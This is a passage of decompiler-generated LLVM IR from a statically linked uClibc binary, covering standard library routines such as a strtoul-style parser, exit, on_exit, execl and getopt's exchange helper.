  br i1 %v1_805ff05, label %dec_label_pc_805ff2b, label %dec_label_pc_805ff07

dec_label_pc_805ff07:                             ; preds = %dec_label_pc_805fefd
  %v1_805ff07 = add i32 %arg3, 10
  store i32 %v1_805ff07, i32* %esi.global-to-local, align 4
  %v1_805ff0a = inttoptr i32 %v0_805ff0f to i8*
  %v2_805ff0a = load i8, i8* %v1_805ff0a, align 1
  %v8_805ff0a = icmp eq i8 %v2_805ff0a, 48
  %v1_805ff0d = icmp eq i1 %v8_805ff0a, false
  br i1 %v1_805ff0d, label %dec_label_pc_805ff21, label %dec_label_pc_805ff0f

dec_label_pc_805ff0f:                             ; preds = %dec_label_pc_805ff07
  %v1_805ff0f = add i32 %v0_805ff0f, 1
  store i32 %v1_805ff0f, i32* %ebx.global-to-local, align 4
  %v1_805ff10 = add i32 %arg3, 8
  store i32 %v1_805ff10, i32* %esi.global-to-local, align 4
  %v1_805ff15 = inttoptr i32 %v1_805ff0f to i8*
  %v2_805ff15 = load i8, i8* %v1_805ff15, align 1
  %v3_805ff15 = zext i8 %v2_805ff15 to i32
  %v5_805ff15 = and i32 %v3_805fede.lcssa, -256
  %v6_805ff15 = or i32 %v5_805ff15, %v3_805ff15
  %v1_805ff17 = or i32 %v6_805ff15, 32
  %v3_805ff17 = trunc i32 %v1_805ff17 to i8
  store i32 %v1_805ff17, i32* %eax.global-to-local, align 4
  %v10_805ff1a = icmp eq i8 %v3_805ff17, 120
  %v1_805ff1c = icmp eq i1 %v10_805ff1a, false
  br i1 %v1_805ff1c, label %dec_label_pc_805ff21, label %dec_label_pc_805ff1e

dec_label_pc_805ff1e:                             ; preds = %dec_label_pc_805ff0f
  %v2_805ff1e = mul i32 %v1_805ff10, 2
  store i32 %v2_805ff1e, i32* %esi.global-to-local, align 4
  %v1_805ff20 = add i32 %v0_805ff0f, 2
  store i32 %v1_805ff20, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805ff21

dec_label_pc_805ff21:                             ; preds = %dec_label_pc_805ff0f, %dec_label_pc_805ff07, %dec_label_pc_805ff1e
  %v0_805ff4a11 = phi i32 [ %v1_805ff0f, %dec_label_pc_805ff0f ], [ %v0_805ff0f, %dec_label_pc_805ff07 ], [ %v1_805ff20, %dec_label_pc_805ff1e ]
  %v0_805ffa119 = phi i32 [ %v1_805ff0f, %dec_label_pc_805ff0f ], [ %v4_805fed1, %dec_label_pc_805ff07 ], [ %v1_805ff0f, %dec_label_pc_805ff1e ]
  %v0_805ff21 = phi i32 [ %v1_805ff10, %dec_label_pc_805ff0f ], [ %v1_805ff07, %dec_label_pc_805ff07 ], [ %v2_805ff1e, %dec_label_pc_805ff1e ]
  %v7_805ff24 = icmp sgt i32 %v0_805ff21, 16
  br i1 %v7_805ff24, label %dec_label_pc_805ff26, label %dec_label_pc_805ff2b

dec_label_pc_805ff26:                             ; preds = %dec_label_pc_805ff21
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805ff2b

dec_label_pc_805ff2b:                             ; preds = %dec_label_pc_805ff21, %dec_label_pc_805fefd, %dec_label_pc_805ff26
  %v0_805ffa120 = phi i32 [ %v0_805ffa119, %dec_label_pc_805ff21 ], [ %v4_805fed1, %dec_label_pc_805fefd ], [ %v0_805ffa119, %dec_label_pc_805ff26 ]
  %v0_805ff4a12 = phi i32 [ %v0_805ff4a11, %dec_label_pc_805ff21 ], [ %v0_805ff0f, %dec_label_pc_805fefd ], [ %v0_805ff4a11, %dec_label_pc_805ff26 ]
  %v0_805ff3a = phi i32 [ %v0_805ff21, %dec_label_pc_805ff21 ], [ %arg3, %dec_label_pc_805fefd ], [ 16, %dec_label_pc_805ff26 ]
  %v1_805ff2b = add i32 %v0_805ff3a, -2
  store i32 %v1_805ff2b, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_805ff33 = icmp ugt i32 %v1_805ff2b, 34
  br i1 %v6_805ff33, label %dec_label_pc_805ff96, label %dec_label_pc_805ff35

dec_label_pc_805ff35:                             ; preds = %dec_label_pc_805ff2b
  %div = udiv i32 -1, %v0_805ff3a
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp37 = urem i32 -1, %v0_805ff3a
  %v1_805ff3c = trunc i32 %tmp37 to i8
  store i32 0, i32* @edx, align 4
  %v4_805ff76 = urem i32 %arg4, 256
  br label %dec_label_pc_805ff4a

dec_label_pc_805ff48:                             ; preds = %dec_label_pc_805ff8c, %dec_label_pc_805ff76
  %v4_805ff4a.pre = phi i32 [ %v1_805ff60, %dec_label_pc_805ff8c ], [ %v4_805ff4a.pre.pre, %dec_label_pc_805ff76 ]
  %v0_805ff48 = phi i32 [ %v1_805ff67, %dec_label_pc_805ff8c ], [ %v0_805ff48.pre, %dec_label_pc_805ff76 ]
  br label %dec_label_pc_805ff4a

dec_label_pc_805ff4a:                             ; preds = %dec_label_pc_805ff35, %dec_label_pc_805ff48
  %v0_805ffa118 = phi i32 [ %v0_805ffa120, %dec_label_pc_805ff35 ], [ %v0_805ff48, %dec_label_pc_805ff48 ]
  %v0_805ff67 = phi i32 [ %v0_805ff4a12, %dec_label_pc_805ff35 ], [ %v0_805ff48, %dec_label_pc_805ff48 ]
  %v4_805ff4a = phi i32 [ %div, %dec_label_pc_805ff35 ], [ %v4_805ff4a.pre, %dec_label_pc_805ff48 ]
  %v1_805ff4a = inttoptr i32 %v0_805ff67 to i8*
  %v2_805ff4a = load i8, i8* %v1_805ff4a, align 1
  %v3_805ff4a = zext i8 %v2_805ff4a to i32
  %v5_805ff4a = and i32 %v4_805ff4a, -256
  %v6_805ff4a = or i32 %v3_805ff4a, %v5_805ff4a
  store i32 %v6_805ff4a, i32* %eax.global-to-local, align 4
  %v1_805ff4c = add i32 %v6_805ff4a, -48
  store i32 %v1_805ff4c, i32* @ecx, align 4
  %v1_805ff4f = trunc i32 %v1_805ff4c to i8
  %tmp54 = icmp ult i8 %v1_805ff4f, 10
  br i1 %tmp54, label %dec_label_pc_805ff60, label %dec_label_pc_805ff54

dec_label_pc_805ff54:                             ; preds = %dec_label_pc_805ff4a
  %v1_805ff54 = or i32 %v6_805ff4a, 32
  %v3_805ff54 = trunc i32 %v1_805ff54 to i8
  store i32 %v1_805ff54, i32* %eax.global-to-local, align 4
  %v1_805ff57 = and i32 %v1_805ff4c, -256
  %v2_805ff57 = or i32 %v1_805ff57, 40
  store i32 %v2_805ff57, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v3_805ff54, 97
  br i1 %tmp55, label %dec_label_pc_805ff60, label %dec_label_pc_805ff5d

dec_label_pc_805ff5d:                             ; preds = %dec_label_pc_805ff54
  %v1_805ff5d = add i32 %v1_805ff54, -87
  store i32 %v1_805ff5d, i32* @ecx, align 4
  br label %dec_label_pc_805ff60

dec_label_pc_805ff60:                             ; preds = %dec_label_pc_805ff54, %dec_label_pc_805ff4a, %dec_label_pc_805ff5d
  %v0_805ff8f = phi i32 [ %v2_805ff57, %dec_label_pc_805ff54 ], [ %v1_805ff4c, %dec_label_pc_805ff4a ], [ %v1_805ff5d, %dec_label_pc_805ff5d ]
  %v1_805ff60 = urem i32 %v0_805ff8f, 256
  store i32 %v1_805ff60, i32* %eax.global-to-local, align 4
  %v1_805ff63 = load i32, i32* %esi.global-to-local, align 4
  %v2_805ff63 = sub i32 %v1_805ff60, %v1_805ff63
  %v10_805ff63 = and i32 %v2_805ff63, %v1_805ff63
  %v11_805ff63 = icmp slt i32 %v10_805ff63, 0
  %v13_805ff63 = icmp slt i32 %v2_805ff63, 0
  %v2_805ff65 = icmp eq i1 %v13_805ff63, %v11_805ff63
  br i1 %v2_805ff65, label %dec_label_pc_805ff96, label %dec_label_pc_805ff67

dec_label_pc_805ff67:                             ; preds = %dec_label_pc_805ff60
  %v1_805ff67 = add i32 %v0_805ff67, 1
  store i32 %v1_805ff67, i32* %ebx.global-to-local, align 4
  %v0_805ff68 = load i32, i32* @edx, align 4
  %tmp = icmp ugt i32 %v0_805ff68, %div
  br i1 %tmp, label %dec_label_pc_805ff76, label %dec_label_pc_805ff6e

dec_label_pc_805ff6e:                             ; preds = %dec_label_pc_805ff67
  %v15_805ff68 = icmp eq i32 %v0_805ff68, %div
  %v1_805ff6e = icmp eq i1 %v15_805ff68, false
  br i1 %v1_805ff6e, label %dec_label_pc_805ff8c, label %dec_label_pc_805ff70

dec_label_pc_805ff70:                             ; preds = %dec_label_pc_805ff6e
  %v1_805ff70 = trunc i32 %v0_805ff8f to i8
  %tmp56 = icmp ugt i8 %v1_805ff70, %v1_805ff3c
  br i1 %tmp56, label %dec_label_pc_805ff76, label %dec_label_pc_805ff8c

dec_label_pc_805ff76:                             ; preds = %dec_label_pc_805ff70, %dec_label_pc_805ff67
  store i32 %v4_805ff76, i32* %eax.global-to-local, align 4
  %v0_805ff7a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805ff7a = and i32 %v0_805ff7a, %v4_805ff76
  store i32 %v2_805ff7a, i32* %ebp.global-to-local, align 4
  %v1_805ff7c = call i32 @__errno_location(i32 %div)
  store i32 %v1_805ff7c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_805ff84 = inttoptr i32 %v1_805ff7c to i32*
  store i32 34, i32* %v1_805ff84, align 4
  %v0_805ff48.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805ff4a.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ff48

dec_label_pc_805ff8c:                             ; preds = %dec_label_pc_805ff70, %dec_label_pc_805ff6e
  %v4_805ff8c = mul i32 %v0_805ff68, %v1_805ff63
  store i32 %v1_805ff60, i32* %eax.global-to-local, align 4
  %v2_805ff92 = add i32 %v4_805ff8c, %v1_805ff60
  store i32 %v2_805ff92, i32* @edx, align 4
  br label %dec_label_pc_805ff48

dec_label_pc_805ff96:                             ; preds = %dec_label_pc_805ff60, %dec_label_pc_805ff2b
  %v0_805ffa1 = phi i32 [ %v0_805ffa120, %dec_label_pc_805ff2b ], [ %v0_805ffa118, %dec_label_pc_805ff60 ]
  %stack_var_-24.0 = phi i32 [ %tmp26, %dec_label_pc_805ff2b ], [ %div, %dec_label_pc_805ff60 ]
  %v4_805ff96 = icmp eq i32 %arg2, 0
  br i1 %v4_805ff96, label %dec_label_pc_805ffa3, label %dec_label_pc_805ff9d

dec_label_pc_805ff9d:                             ; preds = %dec_label_pc_805ff96
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_805ffa1 = inttoptr i32 %arg2 to i32*
  store i32 %v0_805ffa1, i32* %v2_805ffa1, align 4
  br label %dec_label_pc_805ffa3

dec_label_pc_805ffa3:                             ; preds = %dec_label_pc_805ff96, %dec_label_pc_805ff9d
  %v0_805ffa3 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_805ffa3, i32* %eax.global-to-local, align 4
  %v1_805ffa5 = trunc i32 %v0_805ffa3 to i8
  %v6_805ffa5 = icmp eq i8 %v1_805ffa5, 0
  %v2_805ffa7 = zext i1 %v6_805ffa5 to i32
  %v1_805ffa93 = or i32 %v2_805ffa7, -2147483648
  store i32 %v1_805ffa93, i32* %ebx.global-to-local, align 4
  %v5_805ffaf = icmp eq i8 %tmp36, 0
  br i1 %v5_805ffaf, label %dec_label_pc_805ffc7, label %dec_label_pc_805ffb6

dec_label_pc_805ffb6:                             ; preds = %dec_label_pc_805ffa3
  %v0_805ffb6 = load i32, i32* @edx, align 4
  %tmp57 = icmp ugt i32 %v0_805ffb6, %v1_805ffa93
  br i1 %tmp57, label %dec_label_pc_805ffba, label %dec_label_pc_805ffc7

dec_label_pc_805ffba:                             ; preds = %dec_label_pc_805ffb6
  %v1_805ffba = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_805ffba, i32* %eax.global-to-local, align 4
  %v0_805ffbf = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805ffbf, i32* @edx, align 4
  %v1_805ffc1 = inttoptr i32 %v1_805ffba to i32*
  store i32 34, i32* %v1_805ffc1, align 4
  %v0_805ffc7.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805ffc7

dec_label_pc_805ffc7:                             ; preds = %dec_label_pc_805ffb6, %dec_label_pc_805ffa3, %dec_label_pc_805ffba
  %v0_805ffc7 = phi i32 [ %v0_805ffa3, %dec_label_pc_805ffb6 ], [ %v0_805ffa3, %dec_label_pc_805ffa3 ], [ %v0_805ffc7.pre, %dec_label_pc_805ffba ]
  store i32 %v0_805ffc7, i32* %eax.global-to-local, align 4
  %v3_805ffc9 = trunc i32 %v0_805ffc7 to i8
  %v4_805ffc9 = icmp eq i8 %v3_805ffc9, 0
  %v0_805ffd2.pre = load i32, i32* @edx, align 4
  br i1 %v4_805ffc9, label %dec_label_pc_805ffcf, label %dec_label_pc_805ffcd

dec_label_pc_805ffcd:                             ; preds = %dec_label_pc_805ffc7
  %v1_805ffcd = sub i32 0, %v0_805ffd2.pre
  store i32 %v1_805ffcd, i32* @edx, align 4
  br label %dec_label_pc_805ffcf

dec_label_pc_805ffcf:                             ; preds = %dec_label_pc_805ffc7, %dec_label_pc_805ffcd
  %v0_805ffd2 = phi i32 [ %v1_805ffcd, %dec_label_pc_805ffcd ], [ %v0_805ffd2.pre, %dec_label_pc_805ffc7 ]
  store i32 %v0_805ffd2, i32* %eax.global-to-local, align 4
  %v2_805ffd4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805ffd4, i32* @ebx, align 4
  ret i32 %v0_805ffd2

; uselistorder directives
  uselistorder i32 %v0_805ffd2, { 1, 0 }
  uselistorder i32 %v0_805ffc7, { 1, 0 }
  uselistorder i32 %v0_805ff68, { 2, 1, 0 }
  uselistorder i32 %v1_805ff67, { 1, 0 }
  uselistorder i32 %v2_805ff63, { 1, 0 }
  uselistorder i32 %v1_805ff60, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_805ff8f, { 1, 0 }
  uselistorder i32 %v0_805ff48, { 1, 0 }
  uselistorder i32 %v4_805ff76, { 1, 0 }
  uselistorder i32 %div, { 2, 4, 1, 0, 3, 5 }
  uselistorder i32 %v0_805ff3a, { 1, 0, 2 }
  uselistorder i32 %v2_805ff1e, { 1, 0 }
  uselistorder i32 %v1_805ff17, { 1, 0 }
  uselistorder i32 %v1_805ff10, { 1, 0, 2 }
  uselistorder i32 %v0_805ff0f, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_805fede.lcssa, { 1, 0 }
  uselistorder i32 %v0_805fedd.lcssa, { 1, 0 }
  uselistorder i32 %v1_805fedd, { 0, 3, 2, 1 }
  uselistorder i32 %v4_805fed1, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_805fecb, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 10, 7, 8, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32 -17, { 53, 0, 3, 4, 5, 6, 7, 8, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805ffcf, { 1, 0 }
  uselistorder label %dec_label_pc_805ffc7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805ffa3, { 1, 0 }
  uselistorder label %dec_label_pc_805ff60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805ff4a, { 1, 0 }
  uselistorder label %dec_label_pc_805ff2b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805ff21, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805fefd, { 1, 0 }
  uselistorder label %dec_label_pc_805fefc, { 1, 0 }
  uselistorder label %dec_label_pc_805fedd, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_805ffef = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805ffef, i32* @ebx, align 4
  %v4_805fff4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134583465, i32 ptrtoint (i32* @global_var_8073fa0.796 to i32))
  %v1_8060000 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073fa0.796 to i32))
  %v0_8060005 = load i32, i32* @global_var_807c8a4.797, align 4
  %v1_806000d = icmp eq i32 %v0_8060005, 0
  br i1 %v1_806000d, label %dec_label_pc_806001a, label %dec_label_pc_8060011

dec_label_pc_8060011:                             ; preds = %entry
  %v0_8060014 = load i32, i32* @esi, align 4
  %v1_8060015 = call i32 @unknown_0(i32 %v0_8060014)
  br label %dec_label_pc_806001a

dec_label_pc_806001a:                             ; preds = %entry, %dec_label_pc_8060011
  %v3_806001f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_8060024 = call i32 @__GI___uClibc_fini()
  %v0_8060035 = call i32 @_stdio_term()
  %v0_806003d = load i32, i32* @esi, align 4
  %v1_806003e = call i32 @__GI__exit(i32 %v0_806003d)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 2, 3, 1, 6, 9, 8, 7, 0, 5, 4 }
  uselistorder label %dec_label_pc_806001a, { 1, 0 }
}

define i32 @on_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8060047 = call i32 @__new_exitfn()
  store i32 -1, i32* %eax.global-to-local, align 4
  %v1_8060051 = icmp eq i32 %v0_8060047, 0
  br i1 %v1_8060051, label %dec_label_pc_806006b, label %dec_label_pc_8060055

dec_label_pc_8060055:                             ; preds = %entry
  %v2_8060059 = add i32 %v0_8060047, 4
  %v3_8060059 = inttoptr i32 %v2_8060059 to i32*
  store i32 %arg1, i32* %v3_8060059, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v1_8060060 = inttoptr i32 %v0_8060047 to i32*
  store i32 2, i32* %v1_8060060, align 4
  %v0_8060066 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060066 = add i32 %v0_8060047, 8
  %v3_8060066 = inttoptr i32 %v2_8060066 to i32*
  store i32 %v0_8060066, i32* %v3_8060066, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806006b

dec_label_pc_806006b:                             ; preds = %entry, %dec_label_pc_8060055
  %v0_806006e = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8060055 ]
  ret i32 %v0_806006e

; uselistorder directives
  uselistorder i32 %v0_8060047, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_806006b, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8060074 = load i32, i32* @ebx, align 4
  store i32 %v0_8060074, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8060077 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8060077, i32* %eax.global-to-local, align 4
  %v12_806007a = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8060080

dec_label_pc_8060080:                             ; preds = %dec_label_pc_8060080, %entry
  %v0_8060083 = phi i32 [ 0, %entry ], [ %v1_8060083, %dec_label_pc_8060080 ]
  %stack_var_-16.0 = phi i32 [ %v2_8060077, %entry ], [ %v1_8060084, %dec_label_pc_8060080 ]
  %v1_8060083 = add i32 %v0_8060083, 1
  store i32 %v1_8060083, i32* %esi.global-to-local, align 4
  %v1_8060084 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8060084, i32* %eax.global-to-local, align 4
  %v1_806008a = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_806008a = load i32, i32* %v1_806008a, align 4
  %v3_806008a = icmp eq i32 %v2_806008a, 0
  %v1_806008d = icmp eq i1 %v3_806008a, false
  br i1 %v1_806008d, label %dec_label_pc_8060080, label %dec_label_pc_806008f

dec_label_pc_806008f:                             ; preds = %dec_label_pc_8060080
  %v1_806008f = mul i32 %v1_8060083, 4
  %v2_806008f = add i32 %v1_806008f, 34
  %v1_8060096 = and i32 %v2_806008f, -16
  %v2_8060099 = sub i32 %v12_806007a, %v1_8060096
  %v1_806009e = add i32 %v2_8060099, 15
  %v1_80600a2 = and i32 %v1_806009e, -16
  store i32 %v1_80600a2, i32* @ebx, align 4
  store i32 %v1_80600a2, i32* %ecx.global-to-local, align 4
  %v2_80600a7 = inttoptr i32 %v1_80600a2 to i32*
  store i32 %arg2, i32* %v2_80600a7, align 16
  store i32 %v2_8060077, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80600af

dec_label_pc_80600af:                             ; preds = %dec_label_pc_80600af, %dec_label_pc_806008f
  %stack_var_-16.1 = phi i32 [ %v2_8060077, %dec_label_pc_806008f ], [ %v1_80600b6, %dec_label_pc_80600af ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_80600b2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80600b2 = add i32 %v0_80600b2, 4
  store i32 %v1_80600b2, i32* %ecx.global-to-local, align 4
  %v0_80600b5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80600b5 = add i32 %v0_80600b5, -1
  %v8_80600b5 = icmp eq i32 %v1_80600b5, 0
  store i32 %v1_80600b5, i32* %esi.global-to-local, align 4
  %v1_80600b6 = add i32 %stack_var_-16.1, 4
  %v1_80600bc = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_80600bc = load i32, i32* %v1_80600bc, align 4
  store i32 %v2_80600bc, i32* %eax.global-to-local, align 4
  %v2_80600be = inttoptr i32 %v1_80600b2 to i32*
  store i32 %v2_80600bc, i32* %v2_80600be, align 4
  %v1_80600c0 = icmp eq i1 %v8_80600b5, false
  br i1 %v1_80600c0, label %dec_label_pc_80600af, label %dec_label_pc_80600c2

dec_label_pc_80600c2:                             ; preds = %dec_label_pc_80600af
  %v0_80600c2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80600c2 = load i32, i32* @esp, align 4
  %v2_80600c2 = add i32 %v1_80600c2, -4
  %v3_80600c2 = inttoptr i32 %v2_80600c2 to i32*
  store i32 %v0_80600c2, i32* %v3_80600c2, align 4
  %v0_80600c3 = load i32, i32* @global_var_807c8cc.798, align 4
  %v2_80600c3 = add i32 %v1_80600c2, -8
  %v3_80600c3 = inttoptr i32 %v2_80600c3 to i32*
  store i32 %v0_80600c3, i32* %v3_80600c3, align 4
  %v0_80600c9 = load i32, i32* @ebx, align 4
  %v2_80600c9 = add i32 %v1_80600c2, -12
  %v3_80600c9 = inttoptr i32 %v2_80600c9 to i32*
  store i32 %v0_80600c9, i32* %v3_80600c9, align 4
  %v5_80600ca = add i32 %v1_80600c2, -16
  %v6_80600ca = inttoptr i32 %v5_80600ca to i32*
  store i32 %arg1, i32* %v6_80600ca, align 4
  %v1_80600cd = inttoptr i32 %v1_80600b6 to i8*
  %v2_80600cd = call i32 @__GI_execve(i8* %v1_80600cd)
  store i32 %v2_80600cd, i32* %eax.global-to-local, align 4
  %v2_80600d5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80600d5, i32* @ebx, align 4
  ret i32 %v2_80600cd

; uselistorder directives
  uselistorder i32 %v1_80600b5, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8060084, { 1, 0 }
  uselistorder i32 %v1_8060083, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8060077, { 0, 2, 1, 3 }
}

define i32 @exchange() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80600df = load i32, i32* @ebx, align 4
  store i32 %v0_80600df, i32* %stack_var_-16, align 4
  %v0_80600e3 = load i32, i32* @edx, align 4
  store i32 %v0_80600e3, i32* %esi.global-to-local, align 4
  %v0_80600e5 = load i32, i32* @eax, align 4
  store i32 %v0_80600e5, i32* %stack_var_-40, align 4
  %v1_80600e8 = add i32 %v0_80600e3, 20
  %v2_80600e8 = inttoptr i32 %v1_80600e8 to i32*
  %v3_80600e8 = load i32, i32* %v2_80600e8, align 4
  store i32 %v3_80600e8, i32* %eax.global-to-local, align 4
  %v1_80600ef = inttoptr i32 %v0_80600e3 to i32*
  %v2_80600ef = load i32, i32* %v1_80600ef, align 4
  store i32 %v2_80600ef, i32* %eax.global-to-local, align 4
  %v1_80600f1 = add i32 %v0_80600e3, 24
  %v2_80600f1 = inttoptr i32 %v1_80600f1 to i32*
  %v3_80600f1 = load i32, i32* %v2_80600f1, align 4
  %v7_806019431 = icmp sgt i32 %v2_80600ef, %v3_80600f1
  store i32 %v3_80600f1, i32* %eax.global-to-local, align 4
  br i1 %v7_806019431, label %dec_label_pc_8060196.lr.ph, label %dec_label_pc_80601a2

dec_label_pc_8060196.lr.ph:                       ; preds = %entry, %dec_label_pc_8060154
  %v2_80600ef.pn = phi i32 [ %v2_806012f.lcssa, %dec_label_pc_8060154 ], [ %v2_80600ef, %entry ]
  %stack_var_-36.0.ph33 = phi i32 [ %stack_var_-36.023, %dec_label_pc_8060154 ], [ %v3_80600e8, %entry ]
  %v5_806019034 = sub i32 %v2_80600ef.pn, %v3_80600f1
  %v5_806018621 = icmp sgt i32 %v5_806019034, 0
  br label %dec_label_pc_8060196

dec_label_pc_8060101:                             ; preds = %dec_label_pc_8060196
  store i32 %v5_806019034, i32* %ebp.global-to-local, align 4
  store i32 %v2_806019a, i32* %edi.global-to-local, align 4
  %v8_8060123 = icmp sgt i32 %v5_806019034, %v2_806019a
  br i1 %v8_8060123, label %dec_label_pc_806014e.preheader, label %dec_label_pc_8060182.preheader

dec_label_pc_8060182.preheader:                   ; preds = %dec_label_pc_8060101
  br i1 %v5_806018621, label %dec_label_pc_806015a, label %dec_label_pc_8060188

dec_label_pc_806014e.preheader:                   ; preds = %dec_label_pc_8060101
  %v5_806015224 = icmp sgt i32 %v2_806019a, 0
  %v2_806012f25 = sub i32 %v2_80600ef.pn, %v2_806019a
  br i1 %v5_806015224, label %dec_label_pc_8060127, label %dec_label_pc_8060154

dec_label_pc_8060127:                             ; preds = %dec_label_pc_806014e.preheader, %dec_label_pc_8060127
  %v2_806012f27 = phi i32 [ %v2_806012f, %dec_label_pc_8060127 ], [ %v2_806012f25, %dec_label_pc_806014e.preheader ]
  %stack_var_-24.026 = phi i32 [ %v4_806014a, %dec_label_pc_8060127 ], [ 0, %dec_label_pc_806014e.preheader ]
  %v5_8060131 = add i32 %stack_var_-24.026, %stack_var_-36.023
  %v5_8060135 = add i32 %v2_806012f27, %stack_var_-24.026
  %v2_8060139 = load i32, i32* %stack_var_-40, align 4
  %v2_806013c = mul i32 %v5_8060131, 4
  %v3_806013c = add i32 %v2_8060139, %v2_806013c
  store i32 %v3_806013c, i32* @ecx, align 4
  %v2_806013f = mul i32 %v5_8060135, 4
  %v3_806013f = add i32 %v2_8060139, %v2_806013f
  store i32 %v3_806013f, i32* %eax.global-to-local, align 4
  %v1_8060142 = inttoptr i32 %v3_806013c to i32*
  %v2_8060142 = load i32, i32* %v1_8060142, align 4
  store i32 %v2_8060142, i32* %ebx.global-to-local, align 4
  %v1_8060144 = inttoptr i32 %v3_806013f to i32*
  %v2_8060144 = load i32, i32* %v1_8060144, align 4
  store i32 %v2_8060144, i32* %v1_8060142, align 4
  %v0_8060148 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8060148 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060148 = inttoptr i32 %v1_8060148 to i32*
  store i32 %v0_8060148, i32* %v2_8060148, align 4
  %v4_806014a = add i32 %stack_var_-24.026, 1
  %v4_806014e.pre = load i32, i32* %edi.global-to-local, align 4
  %v5_8060152 = icmp slt i32 %v4_806014a, %v4_806014e.pre
  %v2_806012f = sub i32 %v2_80600ef.pn, %v4_806014e.pre
  br i1 %v5_8060152, label %dec_label_pc_8060127, label %dec_label_pc_8060154

dec_label_pc_8060154:                             ; preds = %dec_label_pc_8060127, %dec_label_pc_806014e.preheader
  %v2_806012f.lcssa = phi i32 [ %v2_806012f25, %dec_label_pc_806014e.preheader ], [ %v2_806012f, %dec_label_pc_8060127 ]
  %v7_8060194 = icmp sgt i32 %v2_806012f.lcssa, %v3_80600f1
  store i32 %v3_80600f1, i32* %eax.global-to-local, align 4
  br i1 %v7_8060194, label %dec_label_pc_8060196.lr.ph, label %dec_label_pc_80601a2

dec_label_pc_806015a:                             ; preds = %dec_label_pc_8060182.preheader, %dec_label_pc_806015a
  %stack_var_-20.022 = phi i32 [ %v4_806017e, %dec_label_pc_806015a ], [ 0, %dec_label_pc_8060182.preheader ]
  %v2_806015e = load i32, i32* %stack_var_-40, align 4
